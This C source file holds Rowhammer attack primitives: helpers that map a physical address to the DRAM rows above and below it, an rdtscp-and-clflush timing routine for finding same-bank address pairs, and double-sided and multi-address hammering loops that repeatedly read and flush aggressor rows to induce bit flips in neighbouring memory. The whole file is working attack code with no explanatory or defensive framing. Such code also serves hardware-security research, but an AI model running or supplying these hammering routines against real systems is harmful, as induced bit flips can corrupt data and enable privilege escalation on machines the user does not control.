#define COLUMN_END 13
#define BANK_END 16
#define COLUMN_MASK (((1) << (COLUMN_END)) - (1))
#define BANK_MASK (((1) << (BANK_END)) - (1) - COLUMN_MASK)
#define ROW_MASK ((~BANK_MASK) & (~COLUMN_MASK))
#define HAMMER_NUM 50000
#define DIFF_NUM 10000000

unsigned long get_upper_row(unsigned long ptr)
{
    unsigned long bank,row,column,row_1,row_2;

    bank = ptr & 0x307000;
    row_1 = ptr & 0x1ffc00000;
    row_2 = ptr & 0xf0000;
    row_1 = row_1 >> 18;
    row_2 = row_2 >> 16;
    row = (row_1 | row_2) + 1;
    row_1 = (row & 0x7ff0) >> 4;
    row_2 = (row & 0xf);
    row = (row_1 << 22) | (row_2 << 16);
    column = ptr & 0x8fff;

    return (bank | row | column);
}

unsigned long get_lower_row(unsigned long ptr)
{
   unsigned long bank,row,column,row_1,row_2;

    bank = ptr & 0x307000;
    row_1 = ptr & 0x1ffc00000;
    row_2 = ptr & 0xf0000;
    row_1 = row_1 >> 18;
    row_2 = row_2 >> 16;
    row = (row_1 | row_2) - 1;
    row_1 = (row & 0x7ff0) >> 4;
    row_2 = (row & 0xf);
    row = (row_1 << 22) | (row_2 << 16);
    column = ptr & 0x8fff;

    return (bank | row | column);
}

unsigned long get_time_difference(void *_ptr1, void *_ptr2)
{
    unsigned long low, high, start_cycle, end_cycle;
    volatile int *ptr1 = _ptr1, *ptr2 = _ptr2;
    int i;

    __asm__ __volatile__(
            "mfence\n\t"
            "rdtscp\n\t"
            "mfence\n\t"
            : "=a" (low), "=d" (high)
            );
    start_cycle = ((low) | (high) << 32);

    for(i = 0; i < DIFF_NUM; i++)
    {
        __asm__ __volatile__(
                "mov (%0), %%rdx\n\t"
                "mov (%1), %%rdx\n\t"
                "clflush (%0)\n\t"
                "clflush (%1)\n\t"
                :
                : "r" (ptr1), "r" (ptr2)
                : "rdx"
                );
    }

    __asm__ __volatile__(
            "mfence\n\t"
            "rdtscp\n\t"
            "mfence\n\t"
            : "=a" (low), "=d" (high)
            );
    end_cycle = ((low) | (high) << 32);

    return end_cycle - start_cycle;
}

void double_sided_hammer(long *upper, long *lower)
{
    int i;

    for(i = 0; i < HAMMER_NUM; i++)
    {
        __asm__ __volatile__(
                "mov (%0), %%rdx\n\t"
                "mov (%1), %%rdx\n\t"
                "clflush (%0)\n\t"
                "clflush (%1)\n\t"
                :
                : "r" (upper), "r" (lower)
                : "rdx"
                );
    }
}

void three_dimensional_hammer(
    long *upper,
    long *lower,
    long *ibank_addr,
    long *jbank_addr,
    long *ibank_evict,
    long *jbank_evict)
{
    int i;

    for(i = 0; i < HAMMER_NUM; i++)
    {
        __asm__ __volatile__(
                "mov (%0), %%rdx\n\t"
                "mov (%1), %%rdx\n\t"
                "mov (%2), %%rdx\n\t"
                "mov (%3), %%rdx\n\t"
                "mov (%4), %%rdx\n\t"
                "mov (%5), %%rdx\n\t"
                "clflush (%0)\n\t"
                "clflush (%1)\n\t"
                :
                : "r"(upper), "r"(lower), "r"(ibank_addr), "r"(jbank_addr), "r"(ibank_evict), "r"(jbank_evict)
                : "rdx"
                );
    }
}
